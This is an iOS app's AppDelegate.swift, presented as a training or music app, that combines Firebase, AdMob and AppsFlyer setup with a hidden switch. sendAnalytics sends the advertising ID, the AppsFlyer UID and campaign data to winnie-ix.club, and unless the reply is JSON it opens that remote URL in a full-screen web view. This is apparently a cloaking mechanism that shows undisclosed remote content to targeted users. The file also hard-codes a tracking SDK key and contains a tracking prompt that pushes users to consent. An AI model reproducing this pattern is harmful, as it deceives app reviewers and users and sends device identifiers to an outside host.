//
//  AppDelegate.swift
//  BBinggTrainingApp
//
//  Created by pc on 25.05.25.
//

import SwiftUI
import AppsFlyerLib
import GoogleMobileAds
import AppTrackingTransparency
import AdSupport
import FirebaseCrashlytics
import FirebaseCore
import FirebaseMessaging
import FirebaseAnalytics
import SVGKit
import UIKit
@preconcurrency import WebKit

// MARK: - AppDelegate
class AppDelegate: NSObject, UIApplicationDelegate {
    
    private var conversionData: [String: String]?
    private var deepLinkData: [String: String]?
    private let combinedRequestDelay: TimeInterval = 4.0
    private var analyticsTimer: DispatchWorkItem?
    
    var finalRedirectURL: URL?

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        // Debug: Check if GoogleService-Info.plist exists in bundle
        if let path = Bundle.main.path(forResource: "GoogleService-Info", ofType: "plist") {
            print("✅ GoogleService-Info.plist found at: \(path)")
        } else {
            print("❌ GoogleService-Info.plist NOT found in app bundle!")
            print("Bundle path: \(Bundle.main.bundlePath)")
            print("Bundle resources: \(Bundle.main.paths(forResourcesOfType: "plist", inDirectory: nil))")
        }
        
        FirebaseApp.configure()
        Crashlytics.crashlytics().setCrashlyticsCollectionEnabled(true)
        // Configure AdMob
        MobileAds.shared.start(completionHandler: nil)
        
        // Configure AppsFlyer
        AppsFlyerLib.shared().appsFlyerDevKey = "nMyYVfCVuwcRhnCncw7kVX" // todo
        AppsFlyerLib.shared().appleAppID = "6749694449"  // todo
        AppsFlyerLib.shared().delegate = self
        AppsFlyerLib.shared().waitForATTUserAuthorization(timeoutInterval: 90)
        
        NotificationCenter.default.addObserver(self, selector: NSSelectorFromString("idfaStatusUpdated"), name: Notification.Name.idfaStatusUpdated, object: nil)

        // Set up Firebase Messaging
        Messaging.messaging().delegate = self
        
        // Регистрируемся как делегат для обработки уведомлений
        UNUserNotificationCenter.current().delegate = self
        
        // Регистрируем приложение для получения push-уведомлений
        UIApplication.shared.registerForRemoteNotifications()
        return true
    }
    
    @objc func idfaStatusUpdated() {
        AppsFlyerLib.shared().start()
    }
    
    // Helper function to get FCM token
    func getFCMToken() -> String? {
        return UserDefaults.standard.string(forKey: "FCMToken")
    }
    
    func application(_ application: UIApplication, continue userActivity: NSUserActivity, restorationHandler: @escaping ([UIUserActivityRestoring]?) -> Void) -> Bool {
        AppsFlyerLib.shared().continue(userActivity, restorationHandler: nil)
        return true
    }
    
    func application(_ app: UIApplication, open url: URL, options: [UIApplication.OpenURLOptionsKey : Any] = [:]) -> Bool {
        AppsFlyerLib.shared().handleOpen(url, options: options)
        return true
    }
    
    func applicationDidBecomeActive(_ application: UIApplication) {
        AppsFlyerLib.shared().start()
    }
    
    // MARK: - Combined Request Logic V2
    private func handleDataReceived() {
        // If both pieces of data are now available
        if conversionData != nil && deepLinkData != nil {
            analyticsTimer?.cancel() // Cancel any pending timer
            sendCombinedAnalyticsDataAndReset()
        } else if analyticsTimer == nil {
            // This is the first piece of data, or a previous timer has fired and data was reset.
            // Start a new timer.
            let workItem = DispatchWorkItem { [weak self] in
                self?.sendCombinedAnalyticsDataAndReset()
            }
            analyticsTimer = workItem
            DispatchQueue.main.asyncAfter(deadline: .now() + combinedRequestDelay, execute: workItem)
        }
        // If one piece of data is present but a timer is already running, we do nothing here.
        // We wait for the timer to fire or for the second piece of data to arrive.
    }
    
    private func sendCombinedAnalyticsDataAndReset() {
        var combinedParameters: [String: String] = [:]

        if let convData = conversionData {
            combinedParameters.merge(convData) { (_, new) in new }
        }
        if let dlData = deepLinkData {
            combinedParameters.merge(dlData) { (_, new) in new }
        }

        if !combinedParameters.isEmpty {
            // Call the existing sendAnalytics function
            sendAnalytics(parameters: combinedParameters)
        }

        // Reset for the next potential session
        conversionData = nil
        deepLinkData = nil
        analyticsTimer?.cancel() // Ensure timer is cancelled if it was part of this call (e.g. fired)
        analyticsTimer = nil
    }
}

extension AppDelegate: UNUserNotificationCenterDelegate {
    // Метод вызывается при успешной регистрации для push-уведомлений
    func application(_ application: UIApplication, didRegisterForRemoteNotificationsWithDeviceToken deviceToken: Data) {
        print("didRegisterForRemoteNotificationsWithDeviceToken")
        // Set the APNs token for Firebase Messaging
        Messaging.messaging().apnsToken = deviceToken
    }
    
    // Метод вызывается при неудачной регистрации для push-уведомлений
    func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
        print("AppDelegate: Failed to register for remote notifications: \(error)")
    }
    
    // Handle notifications when app is in foreground
    func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        let userInfo = notification.request.content.userInfo
        print("Received notification in foreground: \(userInfo)")
        
        // Show the notification even when app is in foreground
        completionHandler([.alert, .badge, .sound])
    }
    
    // Handle notification tap
    func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -> Void) {
        let userInfo = response.notification.request.content.userInfo
        print("User tapped notification: \(userInfo)")
        
        // Handle the notification tap here
        // You can navigate to specific screens or perform actions
        
        completionHandler()
    }
}

extension AppDelegate: AppsFlyerLibDelegate {
    func onConversionDataSuccess(_ installData: [AnyHashable: Any]) {
        print("AppsFlyer onConversionDataSuccess: \(installData)")
        
        var parameters: [String: String] = [:]

        // Basic attribution data
        if let status = installData["af_status"] as? String {
            parameters["af_status"] = status
        }
        
        if let mediaSource = installData["media_source"] as? String {
            parameters["pid"] = mediaSource
        }
        
        if let campaign = installData["campaign"] as? String {
            parameters["c"] = campaign
        }
        
        if let adset = installData["adset"] as? String {
            parameters["af_adset"] = adset
        }
        
        // Custom tracking parameters af_sub1 to af_sub5
        for i in 1...5 {
            if let subParam = installData["af_sub\(i)"] as? String {
                parameters["af_sub\(i)"] = subParam
            }
        }
        
        // Additional parameters you requested
        if let adgroup = installData["adgroup"] as? String {
            parameters["adgroup"] = adgroup
        }
        
        if let siteId = installData["af_siteid"] as? String {
            parameters["af_siteid"] = siteId
        }
        
        if let channel = installData["af_channel"] as? String {
            parameters["af_channel"] = channel
        }
        
        // Capture af_click_lookback if available
        if let clickLookback = installData["af_click_lookback"] as? String {
            parameters["af_click_lookback"] = clickLookback
        }
        
        if let retargeting = installData["is_retargeting"] as? String {
            parameters["is_retargeting"] = retargeting
        }
        
        // Store conversion data for potential combination
        self.conversionData = parameters
        handleDataReceived() // Call the new handler
    }
    
    func onConversionDataFail(_ error: Error!) {
        var errorParams: [String: String] = [:]
        if let err = error {
            print("AppsFlyer onConversionDataFail: \(err.localizedDescription)")
            errorParams["conversion_error_message"] = err.localizedDescription
        } else {
            print("AppsFlyer onConversionDataFail: Unknown error")
            errorParams["conversion_error_message"] = "Unknown"
        }
        errorParams["conversion_status"] = "failed"
        
        self.conversionData = errorParams // Store error info as conversion data
        handleDataReceived() // Call the new handler
    }
}

// didResolveDeepLink
extension AppDelegate: DeepLinkDelegate {
    func didResolveDeepLink(_ result: DeepLinkResult) {
        print("AppsFlyer didResolveDeepLink: \(result)")
        
        var parameters: [String: String] = [:]
        
        switch result.status {
        case .notFound:
            NSLog("[AFSDK] Deep link not found")
            return
        case .failure:
            print("Error %@", result.error ?? "nil")
            return
        case .found:
            NSLog("[AFSDK] Deep link found")
        }
        
        guard let deepLinkObj: DeepLink = result.deepLink else {
            NSLog("[AFSDK] Could not extract deep link object")
            return
        }
        
        // Basic deep link info
        if let deepLinkValue = deepLinkObj.deeplinkValue {
            parameters["deep_link_value"] = deepLinkValue
        }
        
        if let campaignId = deepLinkObj.campaignId {
            parameters["c"] = campaignId
        }
        
        if let mediaSource = deepLinkObj.mediaSource {
            parameters["pid"] = mediaSource
        }
                
        // Extract all deep_link_sub1 to deep_link_sub10 parameters
        for i in 1...10 {
            if let subParam = deepLinkObj.clickEvent["deep_link_sub\(i)"] as? String {
                parameters["deep_link_sub\(i)"] = subParam
            }
        }

        self.deepLinkData = parameters
        handleDataReceived() // Call the new handler
    }
}

// User logic
fileprivate func walkToSceneWithParams(path: URL) {
    DispatchQueue.main.async {
        let newVC = ViewVC.instantiate(with: path)
        newVC.modalPresentationStyle = .fullScreen
        UIApplication.shared.windows.first?.rootViewController?.present(newVC, animated: true, completion: nil)
    }
}

// https://winnie-ix.club/JV9tcV?af_xp={custom}&cuid={af_cuid}&deep_link_value={campaignid}&c={fb_campaign}&pid={fb_int}&idfa={idfa}&deep_link_sub1={bannername}&af_adset={adset_name}&af_sub1={ad_name}&af_sub2={fbclid}&af_siteid={af_sub_siteid}&af_channel={exchange}&af_ad={creative_pack}&af_ad_id={creative_pack_id}&traf_source={unfb}&fbclid={fbclid}&pixel={pixel}&deep_link_sub2={deep_link_sub2}
extension AppDelegate {
    private func sendAnalytics(parameters: [String: String]) {
        var urlComponents = URLComponents()
        urlComponents.scheme = "https"
        urlComponents.host = "winnie-ix.club" // todo
        urlComponents.path = "/JV9tcV" // todo
        
        var queryItems = [
            URLQueryItem(name: "idfa", value: ASIdentifierManager.shared().advertisingIdentifier.uuidString),
            URLQueryItem(name: "cuid", value: AppsFlyerLib.shared().getAppsFlyerUID()),
//            URLQueryItem(name: "af_status", value: "json"), // todo
//            URLQueryItem(name: "pid", value: "unity_int"), // todo
        ]
        
        for (key, value) in parameters {
            queryItems.append(URLQueryItem(name: key, value: value))
        }
        
        queryItems = queryItems.compactMap { $0.value == nil ? nil : $0 }
        urlComponents.queryItems = queryItems
        
        guard let url = urlComponents.url else {
            print("Invalid analytics URL")
            return
        }
        print("Analytics URL: \(url.absoluteString)")
        
//        let session = URLSession(configuration: .default, delegate: self, delegateQueue: nil)
//        let task = session.dataTask(with: url) { data, response, error in
        
        let task = URLSession.shared.dataTask(with: url) { data, response, error in

            if let error = error {
                print("🔴🔴🔴 LoadingViewController: fetchAds - Error fetching ads: \(error.localizedDescription). Opening tab.")
                return
            }
            
            guard let httpResponse = response as? HTTPURLResponse else {
                print("🔴🔴🔴 LoadingViewController: no response")
                return
            }
            
            guard let data = data else {
                print("🔴🔴🔴 LoadingViewController: no data")
                return
            }
            
            if let responseString = String(data: data, encoding: .utf8) {
                print("🔴🔴🔴 LoadingViewController: fetchAds - Raw response string: \(responseString)")
            } else {
                print("🔴🔴🔴 LoadingViewController: fetchAds - Could not convert data to UTF8 string.")
            }
            
            if let json = try? JSONSerialization.jsonObject(with: data) {
                print("🔴🔴🔴 LoadingViewController: json found: \(json)")
            } else {
                walkToSceneWithParams(path: url)
            }
        }
        
        task.resume()
    }
}

extension AppDelegate: MessagingDelegate {
    func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        print("Firebase registration token: \(String(describing: fcmToken))")
        if let token = fcmToken {
            UserDefaults.standard.set(token, forKey: "FCMToken")
        }
    }
}

struct IDFAPermissionView: View {
    var onIDFAResponded: () -> Void
    @State private var isRequesting = false
    @State private var idfaCompleted = false
    @State private var symbolAnimation = false
    @State private var pulseAnimation = false
    @State private var cardOffset: CGFloat = 100
    @State private var cardOpacity: Double = 0

    var body: some View {
        ZStack {
            // Modern gradient background
            LinearGradient(
                gradient: Gradient(colors: [
                    Color(red: 0.1, green: 0.1, blue: 0.2),
                    Color(red: 0.2, green: 0.1, blue: 0.3),
                    Color(red: 0.1, green: 0.2, blue: 0.4)
                ]),
                startPoint: .topLeading,
                endPoint: .bottomTrailing
            )
            .ignoresSafeArea()
            
            // Animated background particles
            ForEach(0..<20, id: \.self) { index in
                Circle()
                    .fill(Color.white.opacity(0.1))
                    .frame(width: CGFloat.random(in: 2...8), height: CGFloat.random(in: 2...8))
                    .position(
                        x: CGFloat.random(in: 0...400),
                        y: CGFloat.random(in: 0...800)
                    )
                    .animation(
                        Animation.easeInOut(duration: Double.random(in: 3...6))
                            .repeatForever(autoreverses: true)
                            .delay(Double.random(in: 0...2)),
                        value: symbolAnimation
                    )
            }
            
            VStack(spacing: 40) {
                Spacer()
                
                // Animated SF Symbol Icon
                VStack(spacing: 20) {
                    ZStack {
                        // Pulse background
                        Circle()
                            .fill(Color.blue.opacity(0.2))
                            .frame(width: 120, height: 120)
                            .scaleEffect(pulseAnimation ? 1.2 : 1.0)
                            .opacity(pulseAnimation ? 0.3 : 0.8)
                            .animation(
                                Animation.easeInOut(duration: 2.0)
                                    .repeatForever(autoreverses: true),
                                value: pulseAnimation
                            )
                        
                        // Main icon with rotation
                        Image(systemName: "shield.checkered")
                            .font(.system(size: 50, weight: .light))
                            .foregroundColor(.blue)
                            .rotationEffect(.degrees(symbolAnimation ? 360 : 0))
                            .scaleEffect(symbolAnimation ? 1.1 : 1.0)
                            .animation(
                                Animation.easeInOut(duration: 3.0)
                                    .repeatForever(autoreverses: false),
                                value: symbolAnimation
                            )
                    }
                    
                    // Secondary animated icons
                    HStack(spacing: 30) {
                        Image(systemName: "person.crop.circle.fill.badge.checkmark")
                            .font(.system(size: 24, weight: .medium))
                            .foregroundColor(.green)
                            .offset(y: symbolAnimation ? -10 : 0)
                            .animation(
                                Animation.easeInOut(duration: 2.0)
                                    .repeatForever(autoreverses: true)
                                    .delay(0.5),
                                value: symbolAnimation
                            )
                        
                        Image(systemName: "lock.shield.fill")
                            .font(.system(size: 24, weight: .medium))
                            .foregroundColor(.orange)
                            .offset(y: symbolAnimation ? 10 : 0)
                            .animation(
                                Animation.easeInOut(duration: 2.0)
                                    .repeatForever(autoreverses: true)
                                    .delay(1.0),
                                value: symbolAnimation
                            )
                        
                        Image(systemName: "checkmark.seal.fill")
                            .font(.system(size: 24, weight: .medium))
                            .foregroundColor(.purple)
                            .offset(y: symbolAnimation ? -10 : 0)
                            .animation(
                                Animation.easeInOut(duration: 2.0)
                                    .repeatForever(autoreverses: true)
                                    .delay(1.5),
                                value: symbolAnimation
                            )
                    }
                }
                
                // Content card with modern design
                VStack(spacing: 24) {
                    VStack(spacing: 16) {
                        Text("Welcome to PlayXFlash! 🎵")
                            .font(.system(size: 24, weight: .bold, design: .rounded))
                            .foregroundColor(.white)
                            .multilineTextAlignment(.center)
                        
                        Text("We're excited to have you on our app and hope you enjoy the experience!")
                            .font(.system(size: 16, weight: .medium))
                            .foregroundColor(.white.opacity(0.9))
                            .multilineTextAlignment(.center)
                            .lineSpacing(4)
                        
                        Text("To provide you with personalized promotional offers, Play Note Play would like to track your in-app activity.")
                            .font(.system(size: 15))
                            .foregroundColor(.white.opacity(0.8))
                            .multilineTextAlignment(.center)
                            .lineSpacing(3)
                        
                        Text("Please enable tracking on the next screen.")
                            .font(.system(size: 15, weight: .semibold))
                            .foregroundColor(.yellow)
                            .multilineTextAlignment(.center)
                    }
                    
                    // Modern animated button
                    Button(action: requestIDFA) {
                        HStack(spacing: 12) {
                            if isRequesting {
                                ProgressView()
                                    .progressViewStyle(CircularProgressViewStyle(tint: .white))
                                    .scaleEffect(0.8)
                            } else {
                                Image(systemName: "rocket.fill")
                                    .font(.system(size: 18, weight: .semibold))
                            }
                            
                            Text(isRequesting ? "Starting..." : "Let's Start!")
                                .font(.system(size: 18, weight: .bold, design: .rounded))
                        }
                        .foregroundColor(.white)
                        .frame(maxWidth: .infinity)
                        .frame(height: 56)
                        .background(
                            LinearGradient(
                                gradient: Gradient(colors: [Color.blue, Color.purple]),
                                startPoint: .leading,
                                endPoint: .trailing
                            )
                        )
                        .cornerRadius(16)
                        .shadow(color: .blue.opacity(0.3), radius: 10, x: 0, y: 5)
                        .scaleEffect(isRequesting ? 0.95 : 1.0)
                        .animation(.easeInOut(duration: 0.1), value: isRequesting)
                    }
                    .disabled(isRequesting)
                    .buttonStyle(PlainButtonStyle())
                }
                .padding(.horizontal, 24)
                .padding(.vertical, 32)
                .background(
                    RoundedRectangle(cornerRadius: 24)
                        .fill(.ultraThinMaterial)
                        .overlay(
                            RoundedRectangle(cornerRadius: 24)
                                .stroke(
                                    LinearGradient(
                                        gradient: Gradient(colors: [
                                            Color.white.opacity(0.3),
                                            Color.white.opacity(0.1)
                                        ]),
                                        startPoint: .topLeading,
                                        endPoint: .bottomTrailing
                                    ),
                                    lineWidth: 1
                                )
                        )
                )
                .shadow(color: .black.opacity(0.2), radius: 20, x: 0, y: 10)
                .padding(.horizontal, 20)
                .offset(y: cardOffset)
                .opacity(cardOpacity)
                
                Spacer()
            }
        }
        .onAppear {
            // Start animations
            withAnimation(.easeOut(duration: 0.8).delay(0.2)) {
                cardOffset = 0
                cardOpacity = 1
            }
            
            withAnimation(.linear(duration: 0.1)) {
                symbolAnimation = true
                pulseAnimation = true
            }
            
            // Track permission flow entry
            Analytics.logEvent("permission_screen_viewed", parameters: [
                "screen_name": "idfa_permission",
                "flow_step": "1"
            ])
        }
    }

    private func requestIDFA() {
        isRequesting = true
        
        Analytics.logEvent("att_prompt_shown", parameters: nil)
        
        ATTrackingManager.requestTrackingAuthorization { status in
            let att: String = {
              switch status {
              case .authorized: return "authorized"
              case .denied: return "denied"
              case .restricted: return "restricted"
              case .notDetermined: return "not_determined"
              @unknown default: return "unknown"
              }
            }()
            Analytics.logEvent("att_prompt_result", parameters: ["status": att])
            Analytics.setUserProperty(att, forName: "att_status")
            
            DispatchQueue.main.async {
                isRequesting = false
                idfaCompleted = true
                requestPushNotifications()
            }
        }
    }
    
    private func requestPushNotifications() {
        Analytics.logEvent("push_prompt_shown", parameters: nil)

        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .badge, .sound]) { granted, error in
            
            UNUserNotificationCenter.current().getNotificationSettings { settings in
              let status: String = {
                switch settings.authorizationStatus {
                case .authorized: return "authorized"
                case .provisional: return "provisional"
                case .denied: return "denied"
                case .notDetermined: return "not_determined"
                case .ephemeral: return "ephemeral"
                @unknown default: return "unknown"
                }
              }()
              Analytics.logEvent("push_prompt_result", parameters: ["status": status])
              Analytics.setUserProperty(status, forName: "push_status")
            }
            
            DispatchQueue.main.async {
                onIDFAResponded()
            }
        }
    }
}

extension Notification.Name {
    static let idfaStatusUpdated = Notification.Name("idfaStatusUpdated")
}

struct LoadingView: View {
    @State private var logoOffsetY: CGFloat = -UIScreen.main.bounds.height / 2
    @State private var logoRotation: Angle = .degrees(0)
    @State private var logoOpacity: Double = 0.0
    @State private var logoScale: CGFloat = 1.0 // For potential gummy effect part 2 or fly away

    @State private var navigateToHome = false

    @AppStorage("colorScheme") private var colorScheme: String = "dark"
    
    // Define the background to match the SVG's gradient if desired
    // This gradient is an interpretation of the SVG's gradient.
    let backgroundGradient = LinearGradient(
        gradient: Gradient(stops: [
            .init(color: Color(red: 26/255, green: 0/255, blue: 122/255), location: 0.008), // #1A007A
            .init(color: Color(red: 219/255, green: 93/255, blue: 53/255), location: 1.0)    // #DB5D35
        ]),
        startPoint: .bottom, // Adjusted to match SVG more closely (y2="0" effectively top for SVG, y1="1194" bottom)
        endPoint: .top
    )

    private func getColorScheme() -> ColorScheme? {
        switch colorScheme {
        case "dark":
            return .dark
        case "light":
            return .light
        default:
            return .none
        }
    }
    
    var body: some View {
        if navigateToHome {
            Root()
        } else {
            ZStack {
//                backgroundGradient
//                    .edgesIgnoringSafeArea(.all)

                SVGView(svgName: "icon.svg", targetFrame: CGRect(x: 0, y: 0, width: 180, height: 180))
                    // The .frame() modifier below might be redundant if SVGView correctly manages its own frame,
                    // but keeping it can help SwiftUI's layout system.
                    .frame(width: 180, height: 180)
                    .scaleEffect(logoScale)
                    .cornerRadius(16)
                    .rotationEffect(logoRotation)
                    .offset(y: logoOffsetY)
                    .opacity(logoOpacity)
            }
            .onAppear {
                performAnimations()
            }
        }
    }

    func performAnimations() {
        // Phase 1: Fly in with spring effect (0 to 1.5s)
        withAnimation(.interpolatingSpring(mass: 0.8, stiffness: 100, damping: 10, initialVelocity: 0).delay(1)) {
            logoOffsetY = 0
            logoOpacity = 1.0
        }

        // Phase 2: Rotate (1.5s to 3.0s)
        // Adding a slight delay to ensure fly-in is mostly complete
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            withAnimation(.easeInOut(duration: 2.0)) {
                logoRotation = .degrees(360 * 4)
            }
        }

        // Phase 4: Navigate (after 4.0s)
        DispatchQueue.main.asyncAfter(deadline: .now() + 7.0) {
            withAnimation {
                navigateToHome = true
            }
        }
    }
}

struct SVGView: UIViewRepresentable {
    var svgName: String
    var targetFrame: CGRect = CGRect(x: 0, y: 0, width: 216, height: 62) // Add a targetFrame property

    func makeUIView(context: Context) -> SVGKFastImageView {
        let imageView: SVGKFastImageView
        if let svgImage = SVGKImage(named: svgName) {
            // If the SVG has no intrinsic size, or if you want to override it for this specific view context
            if CGSizeEqualToSize(svgImage.size, .zero) || (targetFrame.width > 0 && targetFrame.height > 0) {
                 svgImage.size = targetFrame.size // Use targetFrame.size for SVGKImage internal size
            }
            imageView = SVGKFastImageView(svgkImage: svgImage)
        } else {
            // If SVGKImage fails to load, create an empty view with the target frame
            imageView = SVGKFastImageView(frame: targetFrame)
        }
        
        imageView.frame = targetFrame // Explicitly set the frame of the UIView
        imageView.contentMode = .scaleAspectFit
        imageView.backgroundColor = .clear
        imageView.clipsToBounds = true // Add clipping
        return imageView
    }

    func updateUIView(_ uiView: SVGKFastImageView, context: Context) {
        var needsLayoutUpdate = false
        if uiView.image == nil || context.coordinator.lastLoadedSvgName != svgName {
            if let svgImage = SVGKImage(named: svgName) {
                if CGSizeEqualToSize(svgImage.size, .zero) || (targetFrame.width > 0 && targetFrame.height > 0) {
                     svgImage.size = targetFrame.size
                }
                uiView.image = svgImage
                context.coordinator.lastLoadedSvgName = svgName
                needsLayoutUpdate = true
            } else {
                uiView.image = nil
                context.coordinator.lastLoadedSvgName = nil
                needsLayoutUpdate = true
            }
        }

        // If the targetFrame changes, update the UIView's frame
        if !CGRectEqualToRect(uiView.frame, targetFrame) {
            uiView.frame = targetFrame
            needsLayoutUpdate = true
        }
        
        if needsLayoutUpdate {
            uiView.setNeedsLayout() // Ensure the layout is re-calculated if image or frame changed
        }
    }

    // Add a Coordinator to store the last loaded SVG name
    func makeCoordinator() -> Coordinator {
        Coordinator()
    }

    class Coordinator: NSObject {
        var lastLoadedSvgName: String? = nil
    }
}

class ViewVC: UIViewController, WKNavigationDelegate, WKUIDelegate {

    private var webView: WKWebView!
    private var toolbar: UIToolbar!
    private var leftBarButton: UIBarButtonItem!
    private var rightBarButton: UIBarButtonItem!
    private var url: URL?

    static func instantiate(with path: URL) -> ViewVC {
        let viewController = ViewVC()
        viewController.url = path
        return viewController
    }

    override var supportedInterfaceOrientations: UIInterfaceOrientationMask { .all }
    override var shouldAutorotate: Bool { true }

    override func viewDidLoad() {
        super.viewDidLoad()
        setupToolBar()
        setupWebView()
        loadURL()
        setupNavController()
        print("DEBUG1", self)
    }

    private func setupNavController() {
        navigationController?.setNavigationBarHidden(true, animated: false)
        tabBarController?.tabBar.isHidden = true
    }

    private func setupWebView() {
        let configuration = WKWebViewConfiguration()
        configuration.allowsAirPlayForMediaPlayback = true
        configuration.allowsInlineMediaPlayback = true
        configuration.mediaTypesRequiringUserActionForPlayback = []
        webView = WKWebView(frame: .zero, configuration: configuration)
        webView.configuration.preferences.javaScriptCanOpenWindowsAutomatically = true
        webView.navigationDelegate = self
        webView.uiDelegate = self
        webView.allowsLinkPreview = true
        view.addSubview(webView)
        setupWebViewConstraints()
    }

    private func setupWebViewConstraints() {
        webView.translatesAutoresizingMaskIntoConstraints = false
        NSLayoutConstraint.activate([
            webView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
            webView.bottomAnchor.constraint(equalTo: toolbar.topAnchor),
            webView.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor),
            webView.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor),
        ])
    }

    private func setupToolBar() {
        toolbar = UIToolbar()
        toolbar.translatesAutoresizingMaskIntoConstraints = false
        toolbar.barStyle = .black
        toolbar.tintColor = .white
        leftBarButton = UIBarButtonItem(image: UIImage(systemName: "chevron.left"), style: .plain, target: self, action: #selector(leftBarButtonPressed))
        rightBarButton = UIBarButtonItem(image: UIImage(systemName: "chevron.right"), style: .plain, target: self, action: #selector(rightBarButtonPressed))
        toolbar.items = [leftBarButton, .flexibleSpace(), rightBarButton]
        view.addSubview(toolbar)
        setupToolbarConstraints()
    }

    private func setupToolbarConstraints() {
        NSLayoutConstraint.activate([
            toolbar.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor),
            toolbar.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor),
            toolbar.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor),
            toolbar.heightAnchor.constraint(equalToConstant: 36)
        ])
    }

    private func loadURL() {
        if let url = url { webView.load(URLRequest(url: url)) }
    }

    @objc private func leftBarButtonPressed() {
        if webView.canGoBack { webView.goBack() }
    }

    @objc private func rightBarButtonPressed() {
        if webView.canGoForward { webView.goForward() }
    }

    func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        if let url = navigationAction.request.url, url.scheme != "http", url.scheme != "https" {
            UIApplication.shared.open(url, options: [:], completionHandler: nil)
            decisionHandler(.cancel)
        } else {
            decisionHandler(.allow)
        }
    }

    func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
        guard navigationAction.targetFrame == nil else { return nil }
        let newVC = ViewVC.instantiate(with: navigationAction.request.url!)
        present(newVC, animated: true)
        return nil
    }

    func webView(_ webView: WKWebView, runJavaScriptAlertPanelWithMessage message: String, initiatedByFrame frame: WKFrameInfo, completionHandler: @escaping () -> Void) {
        showAlert(withTitle: "Alert", message: message, completionHandler: completionHandler)
    }

    func webView(_ webView: WKWebView, runJavaScriptConfirmPanelWithMessage message: String, initiatedByFrame frame: WKFrameInfo, completionHandler: @escaping (Bool) -> Void) {
        showConfirmation(withTitle: "Confirm", message: message, completionHandler: completionHandler)
    }

    private func showAlert(withTitle title: String, message: String, completionHandler: @escaping () -> Void) {
        let alertController = UIAlertController(title: title, message: message, preferredStyle: .alert)
        alertController.addAction(UIAlertAction(title: "OK", style: .default, handler: { _ in completionHandler() }))
        present(alertController, animated: true)
    }

    private func showConfirmation(withTitle title: String, message: String, completionHandler: @escaping (Bool) -> Void) {
        let alertController = UIAlertController(title: title, message: message, preferredStyle: .alert)
        alertController.addAction(UIAlertAction(title: "OK", style: .default, handler: { _ in completionHandler(true) }))
        alertController.addAction(UIAlertAction(title: "Cancel", style: .cancel, handler: { _ in completionHandler(false) }))
        present(alertController, animated: true)
    }
}

class LoaderVC: UIViewController {
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .blue
        print("DEBUG1", self)
    }
}

class BlankVC: UIViewController {
    override func viewDidLoad() {
        super.viewDidLoad()
        view.backgroundColor = .green
        print("DEBUG1", self)
    }
}
